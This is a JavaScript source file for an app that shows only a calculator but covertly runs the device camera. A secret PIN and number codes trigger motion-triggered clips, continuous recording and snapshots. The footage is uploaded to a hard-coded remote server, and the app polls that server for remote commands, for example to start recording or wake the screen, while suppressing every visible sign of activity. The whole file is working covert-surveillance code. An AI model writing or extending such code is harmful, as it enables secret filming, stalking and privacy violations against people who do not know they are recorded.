// ============================================================================
// SecureCam — Hidden Camera System (Calculator-Only UI)
// ============================================================================
// Camera works entirely in background. No camera display is shown to user.
// Everything is controlled from the calculator screen itself.
// Telegram remote commands still work.
// ============================================================================

const SERVER_URL = 'https://familiar-gertrudis-botakingtipd-f3991937.koyeb.app';

// ---- DOM (Calculator only — the only visible UI) ----
const calcScreen = document.getElementById('calcLockScreen');
const displayEl = document.getElementById('calcDisplay');
const historyEl = document.getElementById('calcHistory');

// ---- Hidden camera elements ----
const videoEl = document.getElementById('cameraVideo');
const motionCanvas = document.getElementById('motionCanvas');
const snapshotCanvas = document.getElementById('snapshotCanvas');

// ---- STATE ----
const UNLOCK_PIN = '243';
let isUnlocked = false;          // calculator PIN has been entered
let currentUser = null;
let cameraStream = null;
let facingMode = 'environment';  // back camera by default

// Arm / motion detection
let isArmed = false;
let motionCheckInterval = null;
let prevFrameData = null;
let motionSensitivity = 8;
let lastMotionTime = 0;
let motionCooldownMs = 15000;
let motionClipDurationMs = 10000;
let isRecordingMotionClip = false;

// Continuous recording
let isRecording = false;
let mediaRecorder = null;
let recordedChunks = [];
let recordingSessionId = null;
let recStartTime = null;
let recTimerInterval = null;
let segmentNumber = 0;
let segmentTimeout = null;
let segmentDurationMs = 30000;

// Command polling (Telegram)
let lastCmdTimestamp = 0;
let cmdPollInterval = null;
let heartbeatInterval = null;

// Wake lock
let wakeLock = null;

// ============================================================================
// UTILS
// ============================================================================
function showToast(msg, dur = 3000) {
    // Hidden — no visual feedback
}

function formatDuration(ms) {
    const s = Math.floor(ms / 1000);
    const m = Math.floor(s / 60), sec = s % 60;
    return `${String(m).padStart(2,'0')}:${String(sec).padStart(2,'0')}`;
}

function createSessionId(base = 'secam') {
    return `${base}_${Date.now().toString(36)}_${Math.random().toString(36).slice(2,8)}`;
}

// No visual feedback functions — all hidden
function setDotState(state) {}
function setStatus(text, type) {}
function setHint(text) {}
function updateBadges() {}

// ============================================================================
// CALCULATOR ENGINE (with hidden command system)
// ============================================================================
(function initCalculator() {
    if (!calcScreen || !displayEl) return;

    const opSymbols = { '+': '+', '-': '−', '*': '×', '/': '÷' };
    let display = '0';
    let history = '';
    let firstOperand = null;
    let pendingOp = null;
    let waitingForNext = false;
    let rawEntry = '';

    function fmt(n) {
        if (!Number.isFinite(n)) return 'Error';
        const rounded = Math.round((n + Number.EPSILON) * 1e12) / 1e12;
        if (Math.abs(rounded) >= 1e13 || (Math.abs(rounded) > 0 && Math.abs(rounded) < 1e-7)) {
            return rounded.toExponential(8).replace(/(\.\d*?)0+e/, '$1e').replace(/\.e/, 'e');
        }
        return String(rounded);
    }

    function render() {
        displayEl.textContent = display;
        historyEl.innerHTML = history || '&nbsp;';
        document.querySelectorAll('[data-calc-op]').forEach(btn => {
            btn.classList.toggle('active', btn.dataset.calcOp === pendingOp && waitingForNext);
        });
    }

    function flash(selector) {
        const el = document.querySelector(selector);
        if (!el) return;
        el.classList.add('pressed');
        setTimeout(() => el.classList.remove('pressed'), 120);
    }

    function clearCalc() {
        display = '0'; history = ''; firstOperand = null; pendingOp = null; waitingForNext = false; rawEntry = '';
        render();
    }

    function inputDigit(digit) {
        if (display === 'Error') clearCalc();
        if (waitingForNext) { display = digit; waitingForNext = false; rawEntry = digit; }
        else { display = display === '0' ? digit : display + digit; rawEntry += digit; }
        if (display.replace('-', '').length > 16) display = display.slice(0, display.startsWith('-') ? 17 : 16);
        render();
    }

    function decimal() {
        if (display === 'Error') clearCalc();
        if (waitingForNext) { display = '0.'; waitingForNext = false; rawEntry = '0.'; }
        else if (!display.includes('.')) { display += '.'; rawEntry += '.'; }
        render();
    }

    function calc(a, b, op) {
        if (op === '+') return a + b;
        if (op === '-') return a - b;
        if (op === '*') return a * b;
        if (op === '/') return b === 0 ? NaN : a / b;
        return b;
    }

    function operator(op) {
        if (display === 'Error') clearCalc();
        const val = Number(display);
        rawEntry = '';
        if (pendingOp && waitingForNext) {
            pendingOp = op;
            history = `${fmt(firstOperand)} ${opSymbols[op]}`;
            render();
            return;
        }
        if (firstOperand === null) firstOperand = val;
        else if (pendingOp) {
            const result = calc(firstOperand, val, pendingOp);
            display = Number.isFinite(result) ? fmt(result) : 'Error';
            firstOperand = Number(display);
        }
        pendingOp = op;
        waitingForNext = true;
        history = `${display} ${opSymbols[op]}`;
        render();
    }

    // ---- Calculator Secret Commands ----
    function handleSecretCommand(code) {
        if (!isUnlocked || !currentUser) return;
        switch (code) {
            case '111': toggleArm(); break;
            case '222': captureSnapshot(); break;
            case '333': toggleRecording(); break;
            case '444': switchCamera(); break;
            case '555': /* silent status */ break;
            case '000': handleLogout(); break;
        }
    }

    function equals() {
        // --- PIN UNLOCK: enter 243 and press = ---
        if (!pendingOp && String(rawEntry || display) === UNLOCK_PIN) {
            handlePinUnlock();
            return;
        }

        // --- Secret commands (after unlock) ---
        if (!pendingOp && isUnlocked) {
            const raw = String(rawEntry || display);
            if (['111','222','333','444','555','000'].includes(raw)) {
                handleSecretCommand(raw);
                // Silently reset calculator to 0 — no visual feedback
                display = '0';
                history = '';
                waitingForNext = true;
                rawEntry = '';
                render();
                return;
            }
        }

        // --- Normal calculator equals ---
        if (!pendingOp || firstOperand === null || display === 'Error') return;
        const second = Number(display);
        const expr = `${fmt(firstOperand)} ${opSymbols[pendingOp]} ${fmt(second)} =`;
        const result = calc(firstOperand, second, pendingOp);
        display = Number.isFinite(result) ? fmt(result) : 'Error';
        firstOperand = null;
        pendingOp = null;
        waitingForNext = true;
        rawEntry = display;
        history = expr;
        render();
    }

    function del() {
        if (display === 'Error' || waitingForNext) { display = '0'; rawEntry = ''; waitingForNext = false; }
        else if (display.length <= 1 || (display.startsWith('-') && display.length === 2)) { display = '0'; rawEntry = ''; }
        else { display = display.slice(0, -1); rawEntry = rawEntry.slice(0, -1); }
        render();
    }

    function sign() {
        if (display === '0' || display === 'Error') return;
        display = display.startsWith('-') ? display.slice(1) : '-' + display;
        rawEntry = display;
        render();
    }

    function percent() {
        if (display === 'Error') return;
        display = fmt(Number(display) / 100);
        rawEntry = display;
        render();
    }

    function action(name) {
        if (name === 'clear') clearCalc();
        else if (name === 'delete') del();
        else if (name === 'decimal') decimal();
        else if (name === 'equals') equals();
        else if (name === 'sign') sign();
        else if (name === 'percent') percent();
    }

    // ---- PIN Unlock Handler (silent — no visual change) ----
    function handlePinUnlock() {
        // Silently reset calculator — no visual indicator
        clearCalc();

        // Check if user already logged in (stored)
        const stored = localStorage.getItem('securecamUser');
        if (stored) {
            try {
                const user = JSON.parse(stored);
                if (user && user.username) {
                    isUnlocked = true;
                    // Start camera in background silently
                    startCameraBackground(user);
                    return;
                }
            } catch (e) { localStorage.removeItem('securecamUser'); }
        }

        // No stored user — silently ignore
        isUnlocked = true;
    }

    // ---- Button Event Handling ----
    calcScreen.querySelectorAll('.calc-key').forEach(btn => {
        btn.addEventListener('click', () => {
            if (btn.dataset.calcNum !== undefined) inputDigit(btn.dataset.calcNum);
            else if (btn.dataset.calcOp) operator(btn.dataset.calcOp);
            else if (btn.dataset.calcAction) action(btn.dataset.calcAction);
        });
    });

    // ---- Keyboard Support ----
    window.addEventListener('keydown', (e) => {
        if (!calcScreen.classList.contains('active')) return;
        if (/^[0-9]$/.test(e.key)) { inputDigit(e.key); flash(`[data-calc-num="${e.key}"]`); return; }
        if (['+', '-', '*', '/'].includes(e.key)) { e.preventDefault(); operator(e.key); flash(`[data-calc-op="${e.key}"]`); return; }
        if (e.key === '.' || e.key === ',') { decimal(); flash('[data-calc-action="decimal"]'); return; }
        if (e.key === 'Enter' || e.key === '=') { e.preventDefault(); equals(); flash('[data-calc-action="equals"]'); return; }
        if (e.key === 'Backspace') { del(); flash('[data-calc-action="delete"]'); return; }
        if (e.key === 'Escape') { clearCalc(); flash('[data-calc-action="clear"]'); return; }
        if (e.key === '%') { percent(); flash('[data-calc-action="percent"]'); }
    });

    // ---- Init: calculator is always visible ----
    calcScreen.classList.add('active');
    render();
})();

// ============================================================================
// AUTH (silent — no overlay)
// ============================================================================
function handleLogout() {
    if (!confirm('Stop camera and exit?')) return;
    stopRecording();
    stopMotionDetection();
    if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); cameraStream = null; }
    if (heartbeatInterval) { clearInterval(heartbeatInterval); heartbeatInterval = null; }
    if (cmdPollInterval) { clearInterval(cmdPollInterval); cmdPollInterval = null; }
    releaseWakeLock();
    stopNativeBackgroundService();
    localStorage.removeItem('securecamUser');
    currentUser = null;
    isUnlocked = false;
}
window.handleLogout = handleLogout;

// ============================================================================
// START CAMERA IN BACKGROUND (no video display)
// ============================================================================
async function startCameraBackground(user) {
    currentUser = user;
    localStorage.setItem('securecamUser', JSON.stringify(user));

    await initCamera();
    startClock();
    requestWakeLock();

    // Heartbeat
    sendHeartbeat();
    heartbeatInterval = setInterval(sendHeartbeat, 10000);

    // Screen status reporter
    initScreenStatusReporter();

    // Command polling (Telegram remote)
    startCommandPolling();

    // 🔥 APK build me native background service start karo
    startNativeBackgroundService();
}

// ============================================================================
// NATIVE BACKGROUND SERVICE (APK only)
// ============================================================================
function startNativeBackgroundService() {
    if (window.Capacitor && window.Capacitor.Plugins && window.Capacitor.Plugins.BackgroundCamera) {
        const bgCamera = window.Capacitor.Plugins.BackgroundCamera;
        bgCamera.start({ username: currentUser.username })
            .catch(err => console.warn('BackgroundCamera start failed:', err));

        // Battery optimization exemption (once)
        if (!localStorage.getItem('securecamBatteryPromptShown') && bgCamera.requestBatteryOptimizationExemption) {
            bgCamera.requestBatteryOptimizationExemption()
                .then(() => localStorage.setItem('securecamBatteryPromptShown', '1'))
                .catch(err => console.warn('Battery optimization prompt failed:', err));
        }
    }
}

function stopNativeBackgroundService() {
    if (window.Capacitor && window.Capacitor.Plugins && window.Capacitor.Plugins.BackgroundCamera) {
        window.Capacitor.Plugins.BackgroundCamera.stop().catch(() => {});
    }
}

// ============================================================================
// CAMERA INIT (hidden — no video element displayed)
// ============================================================================
async function initCamera() {
    try {
        if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); }
        cameraStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { ideal: facingMode }, width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false
        });
        // Set the video source but don't display it
        videoEl.srcObject = cameraStream;
        // Ensure video plays (required for canvas capture)
        await videoEl.play();
        console.log('✅ Camera initialized in background');
    } catch (e) {
        console.error('Camera init failed:', e);
    }
}

async function switchCamera() {
    facingMode = facingMode === 'user' ? 'environment' : 'user';
    await initCamera();
}
window.switchCamera = switchCamera;

// ============================================================================
// WAKE LOCK (keep screen ON)
// ============================================================================
async function requestWakeLock() {
    try {
        if ('wakeLock' in navigator) {
            wakeLock = await navigator.wakeLock.request('screen');
            console.log('🔒 Wake Lock acquired');
            wakeLock.addEventListener('release', () => {
                console.log('Wake Lock released');
                // Re-acquire
                if (currentUser) requestWakeLock();
            });
        }
    } catch (e) { console.warn('Wake Lock failed:', e); }
}

async function releaseWakeLock() {
    if (wakeLock) { try { await wakeLock.release(); } catch(e){} wakeLock = null; }
}

document.addEventListener('visibilitychange', async () => {
    if (currentUser && document.visibilityState === 'visible') {
        if (!wakeLock) await requestWakeLock();
    }
});

// ============================================================================
// HEARTBEAT (with screen status)
// ============================================================================
async function sendHeartbeat() {
    if (!currentUser) return;
    try {
        const isScreenOn = document.visibilityState === 'visible';
        await fetch(`${SERVER_URL}/api/users/heartbeat`, {
            method: 'POST', headers: {'Content-Type':'application/json'},
            body: JSON.stringify({
                username: currentUser.username,
                screen_status: isScreenOn ? 'on' : 'off'
            })
        });
    } catch (e) {}
}

// Screen status change detection — instant update
function initScreenStatusReporter() {
    document.addEventListener('visibilitychange', () => {
        if (currentUser) sendHeartbeat();
    });
    if ('wakeLock' in navigator) {
        navigator.wakeLock.addEventListener('release', () => {
            if (currentUser) setTimeout(() => sendHeartbeat(), 1000);
        });
    }
}

// ============================================================================
// CLOCK (shown via heartbeat, not visible on calculator)
// ============================================================================
function startClock() {
    setInterval(() => {
        // Clock runs in background, no visible clock on calculator
    }, 1000);
}

// ============================================================================
// MOTION DETECTION
// ============================================================================
function toggleArm() {
    if (!currentUser || !cameraStream) return;
    isArmed = !isArmed;
    if (isArmed) {
        startMotionDetection();
    } else {
        stopMotionDetection();
    }
}
window.toggleArm = toggleArm;

function startMotionDetection() {
    if (motionCheckInterval) clearInterval(motionCheckInterval);
    prevFrameData = null;
    motionCheckInterval = setInterval(checkMotion, 600);
    console.log('👁️ Motion detection started');
}

function stopMotionDetection() {
    if (motionCheckInterval) { clearInterval(motionCheckInterval); motionCheckInterval = null; }
    prevFrameData = null;
}

function checkMotion() {
    if (!isArmed || !cameraStream || !videoEl.videoWidth) return;

    const GW = 48, GH = 36;
    motionCanvas.width = GW;
    motionCanvas.height = GH;
    const ctx = motionCanvas.getContext('2d');
    ctx.drawImage(videoEl, 0, 0, GW, GH);
    const currentData = ctx.getImageData(0, 0, GW, GH);

    if (!prevFrameData) { prevFrameData = currentData; return; }

    let changedPixels = 0;
    const pixelThreshold = motionSensitivity * 3;
    const totalPixels = GW * GH;
    for (let i = 0; i < currentData.data.length; i += 4) {
        const dr = Math.abs(currentData.data[i]     - prevFrameData.data[i]);
        const dg = Math.abs(currentData.data[i + 1] - prevFrameData.data[i + 1]);
        const db = Math.abs(currentData.data[i + 2] - prevFrameData.data[i + 2]);
        if (dr + dg + db > pixelThreshold) changedPixels++;
    }

    const motionPercent = (changedPixels / totalPixels) * 100;
    prevFrameData = currentData;

    if (motionPercent > 2.0) {
        const now = Date.now();
        if (now - lastMotionTime > motionCooldownMs && !isRecordingMotionClip) {
            lastMotionTime = now;
            onMotionDetected(motionPercent);
        }
    }
}

async function onMotionDetected(intensity) {
    isRecordingMotionClip = true;
    console.log(`🏃 Motion detected! Intensity: ${intensity.toFixed(1)}%`);

    // Send event to backend
    try {
        await fetch(`${SERVER_URL}/api/event`, {
            method: 'POST', headers: {'Content-Type':'application/json'},
            body: JSON.stringify({
                type: 'chat_message',
                roomId: currentUser.username + '_secam',
                text: `🚨 MOTION DETECTED! Intensity: ${intensity.toFixed(1)}%. Recording clip...`,
                sender: 'SecureCam'
            })
        });
    } catch (e) {}

    // Record clip
    await recordClip(motionClipDurationMs, 'motion');
    isRecordingMotionClip = false;
}

// ============================================================================
// RECORDING — CLIP
// ============================================================================
async function recordClip(durationMs, label = 'clip') {
    if (!cameraStream) return;
    try {
        const sessionId = createSessionId(currentUser.username + '_' + label);
        const mimeType = getSupportedMimeType();
        const recorder = new MediaRecorder(cameraStream, { mimeType, videoBitsPerSecond: 1500000 });
        const chunks = [];
        recorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) chunks.push(e.data); };
        recorder.onstop = () => {
            const blob = new Blob(chunks, { type: mimeType });
            if (blob.size > 0) uploadRecording(blob, sessionId, 1, true);
        };
        recorder.start();
        await new Promise(r => setTimeout(r, durationMs));
        recorder.stop();
    } catch (e) {
        console.error('Clip recording failed:', e);
    }
}

// ============================================================================
// RECORDING — CONTINUOUS
// ============================================================================
function toggleRecording() {
    if (!currentUser || !cameraStream) return;
    if (isRecording) stopRecording();
    else startRecording();
}
window.toggleRecording = toggleRecording;

function startRecording() {
    if (!cameraStream || isRecording) return;
    isRecording = true;
    segmentNumber = 0;
    recordingSessionId = createSessionId(currentUser.username + '_cont');
    recStartTime = Date.now();

    startNewSegment();

    try {
        fetch(`${SERVER_URL}/api/event`, {
            method: 'POST', headers: {'Content-Type':'application/json'},
            body: JSON.stringify({ type: 'call_started', roomId: recordingSessionId })
        });
    } catch (e) {}
}

function startNewSegment() {
    if (!isRecording || !cameraStream) return;
    const segNum = ++segmentNumber;
    const sessionId = recordingSessionId;
    recordedChunks = [];
    const mimeType = getSupportedMimeType();
    const recorder = new MediaRecorder(cameraStream, { mimeType, videoBitsPerSecond: 1500000 });
    mediaRecorder = recorder;
    recorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) recordedChunks.push(e.data); };
    recorder.onstop = () => {
        const chunks = recordedChunks.slice();
        if (chunks.length > 0) {
            const blob = new Blob(chunks, { type: mimeType });
            uploadRecording(blob, sessionId, segNum, false);
        }
        recordedChunks = [];
        if (isRecording) startNewSegment();
    };
    recorder.start(1000);
    segmentTimeout = setTimeout(() => {
        if (recorder && recorder.state !== 'inactive') {
            try { recorder.requestData(); } catch(e){}
            recorder.stop();
        }
    }, segmentDurationMs);
}

function stopRecording() {
    if (!isRecording) return;
    isRecording = false;
    if (segmentTimeout) { clearTimeout(segmentTimeout); segmentTimeout = null; }
    if (recTimerInterval) { clearInterval(recTimerInterval); recTimerInterval = null; }

    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        const finalSeg = segmentNumber;
        const finalSession = recordingSessionId;
        const finalMime = mediaRecorder.mimeType || 'video/webm';
        mediaRecorder.onstop = () => {
            const chunks = recordedChunks.slice();
            if (chunks.length > 0) {
                const blob = new Blob(chunks, { type: finalMime });
                uploadRecording(blob, finalSession, finalSeg, true);
            }
            recordedChunks = [];
        };
        try { mediaRecorder.requestData(); } catch(e){}
        try { mediaRecorder.stop(); } catch(e){}
    }

    try {
        fetch(`${SERVER_URL}/api/event`, {
            method: 'POST', headers: {'Content-Type':'application/json'},
            body: JSON.stringify({
                type: 'call_ended',
                roomId: recordingSessionId,
                duration: formatDuration(Date.now() - recStartTime)
            })
        });
    } catch (e) {}
}

// ============================================================================
// SNAPSHOT
// ============================================================================
async function captureSnapshot() {
    if (!cameraStream || !videoEl.videoWidth) return;
    try {
        snapshotCanvas.width = videoEl.videoWidth;
        snapshotCanvas.height = videoEl.videoHeight;
        const ctx = snapshotCanvas.getContext('2d');
        ctx.drawImage(videoEl, 0, 0);

        const blob = await new Promise(resolve => snapshotCanvas.toBlob(resolve, 'image/jpeg', 0.85));
        if (!blob) return;

        const formData = new FormData();
        formData.append('file', blob, `snapshot_${currentUser.username}_${Date.now()}.jpg`);
        formData.append('password', '');
        formData.append('viewOnce', 'false');

        const resp = await fetch(`${SERVER_URL}/api/upload-file`, { method: 'POST', body: formData });
        const result = await resp.json();
        if (!resp.ok) {
            console.error('Snapshot upload failed:', result);
        }
    } catch (e) {
        console.error('Snapshot error:', e);
    }
}
window.captureSnapshot = captureSnapshot;

// ============================================================================
// UPLOAD
// ============================================================================
async function uploadRecording(blob, sessionId, segNum, isLast) {
    if (!blob || blob.size === 0) return;
    try {
        const ext = (blob.type && blob.type.includes('mp4')) ? 'mp4' : 'webm';
        const formData = new FormData();
        formData.append('video', blob, `secam_${sessionId}_part${segNum}.${ext}`);
        formData.append('roomId', sessionId);
        formData.append('segmentNumber', String(segNum));
        formData.append('isLast', String(isLast));
        formData.append('segmentSize', String(blob.size));
        const resp = await fetch(`${SERVER_URL}/api/upload-recording`, { method: 'POST', body: formData });
        if (resp.ok) console.log(`✅ Segment ${segNum} uploaded (${(blob.size/1024/1024).toFixed(1)} MB)`);
        else console.error('Upload failed:', resp.status);
    } catch (e) {
        console.error('Upload error:', e);
    }
}

// ============================================================================
// COMMAND POLLING (Telegram)
// ============================================================================
function startCommandPolling() {
    if (cmdPollInterval) clearInterval(cmdPollInterval);
    cmdPollInterval = setInterval(pollCommands, 2500);
}

async function pollCommands() {
    if (!currentUser) return;
    try {
        const resp = await fetch(`${SERVER_URL}/api/camera-control?username=${encodeURIComponent(currentUser.username)}`);
        const result = await resp.json();
        if (result && result.action && result.action !== 'none' && Number(result.timestamp) > lastCmdTimestamp) {
            lastCmdTimestamp = Number(result.timestamp);
            handleRemoteCommand(result.action);
        }
    } catch (e) {}
}

function handleRemoteCommand(action) {
    console.log('📡 Remote command:', action);
    switch (action) {
        case 'snap':
            captureSnapshot();
            break;
        case 'start_rec':
            if (!isRecording) startRecording();
            break;
        case 'stop_rec':
            if (isRecording) stopRecording();
            break;
        case 'arm':
            if (!isArmed) toggleArm();
            break;
        case 'disarm':
            if (isArmed) toggleArm();
            break;
        case 'cam_on':
            if (cameraStream) { cameraStream.getVideoTracks().forEach(t => t.enabled = true); }
            break;
        case 'cam_off':
            if (cameraStream) { cameraStream.getVideoTracks().forEach(t => t.enabled = false); }
            break;
        case 'cam_switch':
            switchCamera();
            break;
        // 🔥 NEW: Remote screen wake
        case 'add':
            // Try native plugin first (APK)
            if (window.Capacitor && window.Capacitor.Plugins && window.Capacitor.Plugins.BackgroundCamera) {
                window.Capacitor.Plugins.BackgroundCamera.wakeScreen().catch(() => {});
            }
            break;
        // ✅ NEW: Remote status request
        case 'status':
            // Status is already sent by native service
            break;
        default:
            console.log('Unknown command:', action);
    }
}

// ============================================================================
// HELPERS
// ============================================================================
function getSupportedMimeType() {
    if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported) {
        const types = ['video/mp4;codecs=h264,aac', 'video/mp4',
                       'video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm'];
        for (const t of types) { if (MediaRecorder.isTypeSupported(t)) return t; }
    }
    return 'video/webm';
}

// Prevent screen from scrolling / bouncing
document.body.addEventListener('touchmove', (e) => e.preventDefault(), { passive: false });
